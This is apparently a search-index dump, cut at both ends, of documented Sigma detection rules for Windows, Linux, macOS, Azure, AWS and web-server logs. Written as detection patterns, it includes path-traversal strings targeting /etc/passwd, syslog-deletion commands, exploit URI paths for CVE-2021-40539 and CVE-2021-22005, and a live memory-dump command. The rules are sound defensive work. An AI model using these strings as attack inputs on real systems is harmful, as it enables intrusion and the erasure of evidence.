request\u0026#39; condition: selection or selection1 level: medium falsepositives: - Unknown tags: - attack.initial_access - attack.t1078.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_mfa_interrupted.yml/","tags":["attack.initial_access","attack.t1078.004"],"title":"Multifactor Authentication Interupted"},{"categories":null,"contents":"Detect access has been blocked by Conditional Access policies. The access policy does not allow token issuance which might be sights≈ of unauthorizeed login to valid accounts.\nKnown false-positives Unknown References https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/security-operations-privileged-accounts Raw rule (edit) title: User Access Blocked by Azure Conditional Access id: 9a60e676-26ac-44c3-814b-0c2a8b977adf status: experimental author: AlertIQ date: 2021/10/10 description: Detect access has been blocked by Conditional Access policies. The access policy does not allow token issuance which might be sights≈ of unauthorizeed login to valid accounts. references: - https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/security-operations-privileged-accounts logsource: product: azure service: azure.signinlogs detection: selection: ResultType: 53003 condition: selection level: medium falsepositives: - Unknown tags: - attack.credential_access - attack.t1110 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_user_login_blocked_by_conditional_access.yml/","tags":["attack.credential_access","attack.t1110"],"title":"User Access Blocked by Azure Conditional Access"},{"categories":null,"contents":"Detects when a user performs data exfiltration by using DataSvcUtil.exe\nKnown false-positives DataSvcUtil.exe being used may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. DataSvcUtil.exe being executed from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. Penetration Testing References https://gist.github.com/teixeira0xfffff/837e5bfed0d1b0a29a7cb1e5dbdd9ca6 https://docs.microsoft.com/en-us/dotnet/framework/data/wcf/wcf-data-service-client-utility-datasvcutil-exe https://docs.microsoft.com/en-us/dotnet/framework/data/wcf/generating-the-data-service-client-library-wcf-data-services https://docs.microsoft.com/en-us/dotnet/framework/data/wcf/how-to-add-a-data-service-reference-wcf-data-services Raw rule (edit) title: LOLBAS Data Exfiltration by DataSvcUtil.exe id: e290b10b-1023-4452-a4a9-eb31a9013b3a status: experimental author: Ialle Teixeira @teixeira0xfffff, Austin Songer @austinsonger date: 2021/09/30 description: Detects when a user performs data exfiltration by using DataSvcUtil.exe references: - https://gist.github.com/teixeira0xfffff/837e5bfed0d1b0a29a7cb1e5dbdd9ca6 - https://docs.microsoft.com/en-us/dotnet/framework/data/wcf/wcf-data-service-client-utility-datasvcutil-exe - https://docs.microsoft.com/en-us/dotnet/framework/data/wcf/generating-the-data-service-client-library-wcf-data-services - https://docs.microsoft.com/en-us/dotnet/framework/data/wcf/how-to-add-a-data-service-reference-wcf-data-services tags: - attack.exfiltration - attack.t1567 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;/in:\u0026#39; - \u0026#39;/out:\u0026#39; Image|endswith: - \u0026#39;\\DataSvcUtil.exe\u0026#39; condition: selection fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - DataSvcUtil.exe being used may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - DataSvcUtil.exe being executed from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. - Penetration Testing level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_lolbas_data_exfiltration_by_using_datasvcutil.yml/","tags":["attack.exfiltration","attack.t1567"],"title":"LOLBAS Data Exfiltration by DataSvcUtil.exe"},{"categories":null,"contents":"Detects when a possible suspicious driver is being installed via pnputil.exe lolbin\nKnown false-positives Pnputil.exe being used may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Pnputil.exe being executed from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. Penetration Testing References https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/pnputil-command-syntax https://strontic.github.io/xcyclopedia/library/pnputil.exe-60EDC5E6BDBAEE441F2E3AEACD0340D2.html Raw rule (edit) title: Suspicious Driver Install by pnputil.exe status: experimental id: a2ea3ae7-d3d0-40a0-a55c-25a45c87cac1 author: Hai Vaknin @LuxNoBulIshit, Avihay eldad @aloneliassaf, Austin Songer @austinsonger date: 2021/09/30 description: Detects when a possible suspicious driver is being installed via pnputil.exe lolbin references: - https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/pnputil-command-syntax - https://strontic.github.io/xcyclopedia/library/pnputil.exe-60EDC5E6BDBAEE441F2E3AEACD0340D2.html tags: - attack.persistence - attack.t1547 - attack.t1547.006 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - \u0026#39;-i\u0026#39; - \u0026#39;/install\u0026#39; - \u0026#39;-a\u0026#39; - \u0026#39;/add-driver\u0026#39; - \u0026#39;.inf\u0026#39; Image|endswith: - \u0026#39;\\pnputil.exe\u0026#39; condition: selection fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - Pnputil.exe being used may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Pnputil.exe being executed from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. - Penetration Testing level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_lolbins_suspicious_driver_installed_by_pnputil.yml/","tags":["attack.persistence","attack.t1547","attack.t1547.006"],"title":"Suspicious Driver Install by pnputil.exe"},{"categories":null,"contents":"Detects when a user manipulates with Firmward Password on MacOS. NOTE - this command has been disabled on silicon-based apple computers.\nKnown false-positives Legitimate administration activities References https://github.com/usnistgov/macos_security/blob/932a51f3e819dd3e02ebfcf3ef433cfffafbe28b/rules/os/os_firmware_password_require.yaml https://www.manpagez.com/man/8/firmwarepasswd/ https://support.apple.com/guide/security/firmware-password-protection-sec28382c9ca/web Raw rule (edit) title: Suspicious MacOS Firmware Activity id: 7ed2c9f7-c59d-4c82-a7e2-f859aa676099 status: experimental description: Detects when a user manipulates with Firmward Password on MacOS. NOTE - this command has been disabled on silicon-based apple computers. author: Austin Songer @austinsonger date: 2021/09/30 references: - https://github.com/usnistgov/macos_security/blob/932a51f3e819dd3e02ebfcf3ef433cfffafbe28b/rules/os/os_firmware_password_require.yaml - https://www.manpagez.com/man/8/firmwarepasswd/ - https://support.apple.com/guide/security/firmware-password-protection-sec28382c9ca/web logsource: category: process_creation product: macos detection: selection1: Image: \u0026#39;/usr/sbin/firmwarepasswd\u0026#39; CommandLine|contains: - \u0026#39;setpasswd\u0026#39; - \u0026#39;full\u0026#39; - \u0026#39;delete\u0026#39; - \u0026#39;check\u0026#39; condition: selection1 falsepositives: - Legitimate administration activities level: medium tags: - attack.impact ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/macos/process_creation/proc_creation_macos_suspicious_macos_firmware_activity.yml/","tags":["attack.impact"],"title":"Suspicious MacOS Firmware Activity"},{"categories":null,"contents":"The attacker might use LOLBAS nltest.exe for discovery of domain controllers, domain trusts, parent domain and the current user permissions.\nKnown false-positives Red team activity rare legitimate use by an administrator References https://jpcertcc.github.io/ToolAnalysisResultSheet/details/nltest.htm https://attack.mitre.org/software/S0359/ Raw rule (edit) title: Correct Execution of Nltest.exe id: eeb66bbb-3dde-4582-815a-584aee9fe6d1 status: experimental author: Arun Chauhan date: 2021/10/04 description: The attacker might use LOLBAS nltest.exe for discovery of domain controllers, domain trusts, parent domain and the current user permissions. references: - https://jpcertcc.github.io/ToolAnalysisResultSheet/details/nltest.htm - https://attack.mitre.org/software/S0359/ tags: - attack.discovery - attack.t1482 # enumerate trusted domains by using commands such as nltest /domain_trusts - attack.t1018 # enumerate remote domain controllers using options such as /dclist and /dsgetdc - attack.t1016 # enumerate the parent domain of a local machine using /parentdomain logsource: product: windows service: security detection: selection: EventID: 4689 ProcessName|endswith: nltest.exe Status: \u0026#39;0x0\u0026#39; condition: selection fields: - \u0026#39;SubjectUserName\u0026#39; - \u0026#39;SubjectDomainName\u0026#39; falsepositives: - Red team activity - rare legitimate use by an administrator level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_lolbas_execution_of_nltest.yml/","tags":["attack.discovery","attack.t1482","attack.t1018","attack.t1016"],"title":"Correct Execution of Nltest.exe"},{"categories":null,"contents":"Detects the deletion of a prefetch file (AntiForensic)\nKnown false-positives Unknown Raw rule (edit) title: Prefetch File Deletion id: 0a1f9d29-6465-4776-b091-7f43b26e4c89 status: experimental description: Detects the deletion of a prefetch file (AntiForensic) level: high author: Cedric MAURUGEON date: 2021/09/29 modified: 2022/01/15 tags: - attack.defense_evasion - attack.t1070.004 logsource: product: windows category: file_delete detection: selection: TargetFilename|startswith: \u0026#39;C:\\Windows\\Prefetch\\\u0026#39; TargetFilename|endswith: \u0026#39;.pf\u0026#39; exception: Image: \u0026#39;C:\\windows\\system32\\svchost.exe\u0026#39; User|startswith: - \u0026#39;NT AUTHORITY\\SYSTEM\u0026#39; - \u0026#39;AUTORITE NT\\Sys\u0026#39; # French language settings condition: selection and not exception falsepositives: - Unknown ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_delete/file_delete_win_delete_prefetch.yml/","tags":["attack.defense_evasion","attack.t1070.004"],"title":"Prefetch File Deletion"},{"categories":null,"contents":"Detects DLL image load activity as used by FoggyWeb backdoor loader\nKnown false-positives Unlikely References https://www.microsoft.com/security/blog/2021/09/27/foggyweb-targeted-nobelium-malware-leads-to-persistent-backdoor/ Raw rule (edit) title: FoggyWeb Backdoor DLL Loading id: 640dc51c-7713-4faa-8a0e-e7c0d9d4654c status: experimental description: Detects DLL image load activity as used by FoggyWeb backdoor loader references: - https://www.microsoft.com/security/blog/2021/09/27/foggyweb-targeted-nobelium-malware-leads-to-persistent-backdoor/ author: Florian Roth date: 2021/09/27 logsource: category: image_load product: windows detection: selection: Image: C:\\Windows\\ADFS\\version.dll condition: selection falsepositives: - Unlikely level: critical tags: - attack.resource_development - attack.t1587 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/image_load/image_load_foggyweb_nobelium.yml/","tags":["attack.resource_development","attack.t1587"],"title":"FoggyWeb Backdoor DLL Loading"},{"categories":null,"contents":"User Added to an Administrator\u0026rsquo;s Azure AD Role\nKnown false-positives PIM (Privileged Identity Management) generates this event each time \u0026rsquo;eligible role\u0026rsquo; is enabled. References https://attack.mitre.org/techniques/T1098/003/ https://m365internals.com/2021/07/13/what-ive-learned-from-doing-a-year-of-cloud-forensics-in-azure-ad/ Raw rule (edit) title: User Added to an Administrator\u0026#39;s Azure AD Role id: ebbeb024-5b1d-4e16-9c0c-917f86c708a7 description: User Added to an Administrator\u0026#39;s Azure AD Role author: Raphaël CALVET, @MetallicHack date: 2021/10/04 references: - https://attack.mitre.org/techniques/T1098/003/ - https://m365internals.com/2021/07/13/what-ive-learned-from-doing-a-year-of-cloud-forensics-in-azure-ad/ logsource: product: azure service: azure.activitylogs detection: selection: Operation: \u0026#39;Add member to role.\u0026#39; Workload: \u0026#39;AzureActiveDirectory\u0026#39; ModifiedProperties{}.NewValue|endswith: - \u0026#39;Admins\u0026#39; - \u0026#39;Administrator\u0026#39; condition: selection falsepositives: - PIM (Privileged Identity Management) generates this event each time \u0026#39;eligible role\u0026#39; is enabled. level: medium status: experimental tags: - attack.persistence - attack.t1098.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_ad_user_added_to_admin_role.yml/","tags":["attack.persistence","attack.t1098.003"],"title":"User Added to an Administrator's Azure AD Role"},{"categories":null,"contents":"Detects path traversal exploitation attempts\nKnown false-positives Happens all the time on systems exposed to the Internet Penetration testing activity on internal systems Internal vulnerability scanners References https://github.com/projectdiscovery/nuclei-templates Raw rule (edit) title: Path Traversal Exploitation Attempts id: 7745c2ea-24a5-4290-b680-04359cb84b35 author: Subhash Popuri (@pbssubhash), Florian Roth (generalisation) date: 2021/09/25 status: experimental description: Detects path traversal exploitation attempts references: - https://github.com/projectdiscovery/nuclei-templates logsource: category: webserver detection: selection: c-uri|contains: - \u0026#39;../../../../../etc/passwd\u0026#39; - \u0026#39;../../../../windows/\u0026#39; - \u0026#39;../../../../../lib/password\u0026#39; condition: selection falsepositives: - Happens all the time on systems exposed to the Internet - Penetration testing activity on internal systems - Internal vulnerability scanners tags: - attack.initial_access - attack.t1190 level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_path_traversal_exploitation_attempt.yml/","tags":["attack.initial_access","attack.t1190"],"title":"Path Traversal Exploitation Attempts"},{"categories":null,"contents":"Detects attempts to collect data stored in the clipboard from users with the usage of xclip tool. Xclip has to be installed. Highly recommended using rule on servers, due to high usage of clipboard utilities on user workstations.\nKnown false-positives Legitimate usage of xclip tools References https://attack.mitre.org/techniques/T1115/ https://linux.die.net/man/1/xclip https://www.cyberciti.biz/faq/xclip-linux-insert-files-command-output-intoclipboard/ Raw rule (edit) title: Clipboard Collection with Xclip Tool id: 214e7e6c-f21b-47ff-bb6f-551b2d143fcf description: Detects attempts to collect data stored in the clipboard from users with the usage of xclip tool. Xclip has to be installed. Highly recommended using rule on servers, due to high usage of clipboard utilities on user workstations. author: \u0026#39;Pawel Mazur\u0026#39; status: experimental date: 2021/09/24 references: - https://attack.mitre.org/techniques/T1115/ - https://linux.die.net/man/1/xclip - https://www.cyberciti.biz/faq/xclip-linux-insert-files-command-output-intoclipboard/ logsource: product: linux service: auditd detection: xclip: type: EXECVE a0: xclip a1: - \u0026#39;-selection\u0026#39; - \u0026#39;-sel\u0026#39; a2: - clipboard - clip a3: \u0026#39;-o\u0026#39; condition: xclip tags: - attack.collection - attack.t1115 falsepositives: - Legitimate usage of xclip tools level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_clipboard_collection.yml/","tags":["attack.collection","attack.t1115"],"title":"Clipboard Collection with Xclip Tool"},{"categories":null,"contents":"Detects a process memory dump performed by RdrLeakDiag.exe\nKnown false-positives Unknown References https://www.pureid.io/dumping-abusing-windows-credentials-part-1/ Raw rule (edit) title: Process Dump via RdrLeakDiag.exe id: edadb1e5-5919-4e4c-8462-a9e643b02c4b description: Detects a process memory dump performed by RdrLeakDiag.exe status: experimental level: high references: - https://www.pureid.io/dumping-abusing-windows-credentials-part-1/ author: Cedric MAURUGEON date: 2021/09/24 tags: - attack.credential_access - attack.t1003.001 logsource: category: process_creation product: windows detection: selection: OriginalFileName: RdrLeakDiag.exe CommandLine|contains: fullmemdmp condition: selection falsepositives: - Unknown ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_process_dump_rdrleakdiag.yml/","tags":["attack.credential_access","attack.t1003.001"],"title":"Process Dump via RdrLeakDiag.exe"},{"categories":null,"contents":"Detects exploitation attempts using file upload vulnerability CVE-2021-22005 in the VMWare vCenter Server.\nKnown false-positives Vulnerability Scanning/Pentesting References https://kb.vmware.com/s/article/85717 https://www.tenable.com/blog/cve-2021-22005-critical-file-upload-vulnerability-in-vmware-vcenter-server Raw rule (edit) title: VMware vCenter Server File Upload CVE-2021-22005 id: b014ea07-8ea0-4859-b517-50a4e5b7ecec status: experimental description: Detects exploitation attempts using file upload vulnerability CVE-2021-22005 in the VMWare vCenter Server. author: Sittikorn S date: 2021/09/24 references: - https://kb.vmware.com/s/article/85717 - https://www.tenable.com/blog/cve-2021-22005-critical-file-upload-vulnerability-in-vmware-vcenter-server tags: - attack.initial_access - attack.t1190 logsource: category: webserver detection: selection: cs-method: \u0026#39;POST\u0026#39; c-uri|contains: \u0026#39;/analytics/telemetry/ph/api/hyper/send?\u0026#39; condition: selection falsepositives: - Vulnerability Scanning/Pentesting level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_cve_2021_22005_vmware_file_upload.yml/","tags":["attack.initial_access","attack.t1190"],"title":"VMware vCenter Server File Upload CVE-2021-22005"},{"categories":null,"contents":"Detects when an user attached a Lambda layer to an existing function to override a library that is in use by the function, where their malicious code could utilize the function\u0026rsquo;s IAM role for AWS API calls. This would give an adversary access to the privileges associated with the Lambda service role that is attached to that function.\nKnown false-positives Lambda Layer being attached may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Lambda Layer being attached from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.aws.amazon.com/lambda/latest/dg/API_UpdateFunctionConfiguration.html Raw rule (edit) title: AWS Attached Malicious Lambda Layer id: 97fbabf8-8e1b-47a2-b7d5-a418d2b95e3d description: Detects when an user attached a Lambda layer to an existing function to override a library that is in use by the function, where their malicious code could utilize the function\u0026#39;s IAM role for AWS API calls. This would give an adversary access to the privileges associated with the Lambda service role that is attached to that function. author: Austin Songer status: experimental date: 2021/09/23 references: - https://docs.aws.amazon.com/lambda/latest/dg/API_UpdateFunctionConfiguration.html logsource: product: aws service: cloudtrail detection: selection: eventSource: lambda.amazonaws.com eventName|startswith: UpdateFunctionConfiguration condition: selection level: medium tags: - attack.privilege_escalation falsepositives: - Lambda Layer being attached may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Lambda Layer being attached from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/aws/aws_attached_malicious_lambda_layer.yml/","tags":["attack.privilege_escalation"],"title":"AWS Attached Malicious Lambda Layer"},{"categories":null,"contents":"Identifies when suspicious SAML activity has occurred in AWS. An adversary could gain backdoor access via SAML.\nKnown false-positives Automated processes that uses Terraform may lead to false positives. SAML Provider could be updated by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. SAML Provider being updated from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.aws.amazon.com/IAM/latest/APIReference/API_UpdateSAMLProvider.html https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRoleWithSAML.html Raw rule (edit) title: AWS Suspicious SAML Activity id: f43f5d2f-3f2a-4cc8-b1af-81fde7dbaf0e description: Identifies when suspicious SAML activity has occurred in AWS. An adversary could gain backdoor access via SAML. author: Austin Songer status: experimental date: 2021/09/22 references: - https://docs.aws.amazon.com/IAM/latest/APIReference/API_UpdateSAMLProvider.html - https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRoleWithSAML.html logsource: product: aws service: cloudtrail detection: selection1: eventSource: sts.amazonaws.com eventName: AssumeRoleWithSAML selection2: eventSource: iam.amazonaws.com eventName: UpdateSAMLProvider condition: selection1 or selection2 level: medium tags: - attack.initial_access - attack.t1078 - attack.lateral_movement - attack.t1548 - attack.privilege_escalation - attack.t1550 - attack.t1550.001 falsepositives: - Automated processes that uses Terraform may lead to false positives. - SAML Provider could be updated by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - SAML Provider being updated from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/aws/aws_suspicious_saml_activity.yml/","tags":["attack.initial_access","attack.t1078","attack.lateral_movement","attack.t1548","attack.privilege_escalation","attack.t1550","attack.t1550.001"],"title":"AWS Suspicious SAML Activity"},{"categories":null,"contents":"Detects adversary creating screen capture of a desktop with Import Tool. Highly recommended using rule on servers, due to high usage of screenshot utilities on user workstations. ImageMagick must be installed.\nKnown false-positives Legitimate use of screenshot utility References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1113/T1113.md https://attack.mitre.org/techniques/T1113/ https://linux.die.net/man/1/import https://imagemagick.org/ Raw rule (edit) title: Screen Capture with Import Tool id: dbe4b9c5-c254-4258-9688-d6af0b7967fd description: Detects adversary creating screen capture of a desktop with Import Tool. Highly recommended using rule on servers, due to high usage of screenshot utilities on user workstations. ImageMagick must be installed. author: \u0026#39;Pawel Mazur\u0026#39; status: experimental date: 2021/09/21 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1113/T1113.md - https://attack.mitre.org/techniques/T1113/ - https://linux.die.net/man/1/import - https://imagemagick.org/ logsource: product: linux service: auditd detection: import: type: EXECVE a0: import import_window_root: a1: \u0026#39;-window\u0026#39; a2: \u0026#39;root\u0026#39; a3|endswith: - \u0026#39;.png\u0026#39; - \u0026#39;.jpg\u0026#39; - \u0026#39;.jpeg\u0026#39; import_no_window_root: a1|endswith: - \u0026#39;.png\u0026#39; - \u0026#39;.jpg\u0026#39; - \u0026#39;.jpeg\u0026#39; condition: import and (import_window_root or import_no_window_root) tags: - attack.collection - attack.t1113 falsepositives: - Legitimate use of screenshot utility level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_screencapture_import.yml/","tags":["attack.collection","attack.t1113"],"title":"Screen Capture with Import Tool"},{"categories":null,"contents":"Detects usage of a PowerShell command to dump the live memory of a Windows machine\nKnown false-positives Diagnostics References https://docs.microsoft.com/en-us/powershell/module/storage/get-storagediagnosticinfo Raw rule (edit) title: Live Memory Dump Using Powershell id: cd185561-4760-45d6-a63e-a51325112cae status: experimental description: Detects usage of a PowerShell command to dump the live memory of a Windows machine date: 2021/09/21 modified: 2021/10/16 references: - https://docs.microsoft.com/en-us/powershell/module/storage/get-storagediagnosticinfo tags: - attack.t1003 author: Max Altgelt logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: dump: ScriptBlockText|contains|all: - \u0026#39;Get-StorageDiagnosticInfo\u0026#39; - \u0026#39;-IncludeLiveDump\u0026#39; condition: dump falsepositives: - Diagnostics level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_memorydump_getstoragediagnosticinfo.yml/","tags":["attack.t1003"],"title":"Live Memory Dump Using Powershell"},{"categories":null,"contents":"Detects specific commands commonly used to remove or empty the syslog\nKnown false-positives Log rotation References https://www.virustotal.com/gui/file/fc614fb4bda24ae8ca2c44e812d12c0fab6dd7a097472a35dd12ded053ab8474 Raw rule (edit) title: Commands to Clear or Remove the Syslog id: e09eb557-96d2-4de9-ba2d-30f712a5afd3 status: experimental description: Detects specific commands commonly used to remove or empty the syslog author: Max Altgelt date: 2021/09/10 references: - https://www.virustotal.com/gui/file/fc614fb4bda24ae8ca2c44e812d12c0fab6dd7a097472a35dd12ded053ab8474 tags: - attack.impact - attack.t1565.001 logsource: product: linux detection: selection: - \u0026#39;rm /var/log/syslog\u0026#39; - \u0026#39;rm -r /var/log/syslog\u0026#39; - \u0026#39;rm -f /var/log/syslog\u0026#39; - \u0026#39;rm -rf /var/log/syslog\u0026#39; - \u0026#39;mv /var/log/syslog\u0026#39; - \u0026#39; \u0026gt;/var/log/syslog\u0026#39; - \u0026#39; \u0026gt; /var/log/syslog\u0026#39; falsepositives: - \u0026#39;/syslog.\u0026#39; condition: selection and not falsepositives falsepositives: - Log rotation level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/builtin/lnx_clear_syslog.yml/","tags":["attack.impact","attack.t1565.001"],"title":"Commands to Clear or Remove the Syslog"},{"categories":null,"contents":"Detects the exploitation of OMIGOD (CVE-2021-38647) which allows remote execute (RCE) commands as root with just a single unauthenticated HTTP request. Verify, successful, exploitation by viewing the HTTP client (request) body to see what was passed to the server (using PCAP). Within the client body is where the code execution would occur. Additionally, check the endpoint logs to see if suspicious commands or activity occurred within the timeframe of this HTTP request.\nKnown false-positives Exploits that were attempted but unsuccessful. Scanning attempts with the abnormal use of the HTTP POST method with no indication of code execution within the HTTP Client (Request) body. An example would be vulnerability scanners trying to identify unpatched versions while not actually exploiting the vulnerability. See description for investigation tips. References https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure https://twitter.com/neu5ron/status/1438987292971053057?s=20 Raw rule (edit) title: OMIGOD HTTP No Authentication RCE id: ab6b1a39-a9ee-4ab4-b075-e83acf6e346b description: Detects the exploitation of OMIGOD (CVE-2021-38647) which allows remote execute (RCE) commands as root with just a single unauthenticated HTTP request. Verify, successful, exploitation by viewing the HTTP client (request) body to see what was passed to the server (using PCAP). Within the client body is where the code execution would occur. Additionally, check the endpoint logs to see if suspicious commands or activity occurred within the timeframe of this HTTP request. author: Nate Guagenti (neu5ron) date: 2021/09/20 modified: 2019/09/20 references: - https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure - https://twitter.com/neu5ron/status/1438987292971053057?s=20 tags: - attack.privilege_escalation - attack.initial_access - attack.execution - attack.lateral_movement - attack.t1068 - attack.t1190 - attack.t1203 - attack.t1021.006 - attack.t1210 logsource: product: zeek service: http definition: Enable the builtin Zeek script that logs all HTTP header names by adding \u0026#34;@load policy/protocols/http/header-names\u0026#34; to your local.zeek config file. The script can be seen here for reference https://github.com/zeek/zeek/blob/master/scripts/policy/protocols/http/header-names.zeek detection: selection: status_code: 200 uri: /wsman method: POST auth_header: client_header_names|contains: \u0026#39;AUTHORIZATION\u0026#39; too_small_http_client_body: request_body_len: 0 #winrm_ports: # id.resp_p: # - 5985 # - 5986 # - 1270 condition: selection and not auth_header and not too_small_http_client_body #condition: selection and winrm_ports and not auth_header and not too_small_http_client_body # Enable this to only perform search on default WinRM ports, however those ports are sometimes changed and therefore this is disabled by default to give a broader coverage of this rule falsepositives: - Exploits that were attempted but unsuccessful. - Scanning attempts with the abnormal use of the HTTP POST method with no indication of code execution within the HTTP Client (Request) body. An example would be vulnerability scanners trying to identify unpatched versions while not actually exploiting the vulnerability. See description for investigation tips. level: high fields: - id.orig_h - id.resp_h - id.resp_p - status_code - method - uri - request_body_len - response_body_len - user_agent status: stable ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/zeek/zeek_http_omigod_no_auth_rce.yml/","tags":["attack.privilege_escalation","attack.initial_access","attack.execution","attack.lateral_movement","attack.t1068","attack.t1190","attack.t1203","attack.t1021.006","attack.t1210"],"title":"OMIGOD HTTP No Authentication RCE"},{"categories":null,"contents":"Detects suspicious access to URLs that was noticed in cases in which attackers exploitated the ADSelfService vulnerability CVE-2021-40539\nKnown false-positives Unknown References https://us-cert.cisa.gov/ncas/alerts/aa21-259a Raw rule (edit) title: ADSelfService Exploitation id: 6702b13c-e421-44cc-ab33-42cc25570f11 status: experimental description: Detects suspicious access to URLs that was noticed in cases in which attackers exploitated the ADSelfService vulnerability CVE-2021-40539 author: Tobias Michalski, Max Altgelt references: - https://us-cert.cisa.gov/ncas/alerts/aa21-259a date: 2021/09/20 logsource: category: webserver detection: selection: c-uri|contains: - \u0026#39;/help/admin-guide/Reports/ReportGenerate.jsp\u0026#39; - \u0026#39;/ServletApi/../RestApi/LogonCustomization\u0026#39; - \u0026#39;/ServletApi/../RestAPI/Connection\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_cve_2021_40539_adselfservice.yml/","tags":null,"title":"ADSelfService Exploitation"},{"categories":null,"contents":"Detects the execution of Xwizard tool from the non-default directory which can be used to sideload a custom xwizards.dll\nKnown false-positives Windows installed on non-C drive References https://lolbas-project.github.io/lolbas/Binaries/Xwizard/ http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/ Raw rule (edit) title: Xwizard DLL Sideloading id: 193d5ccd-6f59-40c6-b5b0-8e32d5ddd3d1 status: experimental description: Detects the execution of Xwizard tool from the non-default directory which can be used to sideload a custom xwizards.dll references: - https://lolbas-project.github.io/lolbas/Binaries/Xwizard/ - http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/ author: Christian Burkard date: 2021/09/20 tags: - attack.defense_evasion - attack.t1574.002 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\xwizard.exe\u0026#39; filter: Image|startswith: \u0026#39;C:\\Windows\\System32\\\u0026#39; condition: selection and not filter falsepositives: - Windows installed on non-C drive level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_dll_sideload_xwizard.yml/","tags":["attack.defense_evasion","attack.t1574.002"],"title":"Xwizard DLL Sideloading"},{"categories":null,"contents":"Detects Chafer activity attributed to OilRig as reported in Nyotron report in March 2018\nKnown false-positives Unknown References https://nyotron.com/nyotron-discovers-next-generation-oilrig-attacks/ Raw rule (edit) title: Chafer Activity id: 53ba33fd-3a50-4468-a5ef-c583635cfa92 description: Detects Chafer activity attributed to OilRig as reported in Nyotron report in March 2018 status: experimental references: - https://nyotron.com/nyotron-discovers-next-generation-oilrig-attacks/ tags: - attack.persistence - attack.g0049 - attack.t1053.005 - attack.s0111 - attack.t1543.003 - attack.defense_evasion - attack.t1112 - attack.command_and_control - attack.t1071.004 date: 2018/03/23 modified: 2021/11/30 author: Florian Roth, Markus Neis, Jonhnathan Ribeiro, Daniil Yugoslavskiy, oscd.community logsource: product: windows service: system detection: selection_service: Provider_Name: \u0026#39;Service Control Manager\u0026#39; EventID: 7045 ServiceName: - \u0026#39;SC Scheduled Scan\u0026#39; - \u0026#39;UpdatMachine\u0026#39; condition: selection_service falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_apt_chafer_mar18_system.yml/","tags":["attack.persistence","attack.g0049","attack.t1053.005","attack.s0111","attack.t1543.003","attack.defense_evasion","attack.t1112","attack.command_and_control","attack.t1071.004"],"title":"Chafer Activity"},{"categories":null,"contents":"Rule to detect the use of the SCX RunAsProvider ExecuteScript to execute any UNIX/Linux script using the /bin/sh shell. Script being executed gets created as a temp file in /tmp folder with a scx* prefix. Then it is invoked from the following directory /etc/opt/microsoft/scx/conf/tmpdir/. The file in that directory has the same prefix scx*. SCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products including Microsoft Operations Manager. Microsoft Azure, and Microsoft Operations Management Suite.\nKnown false-positives 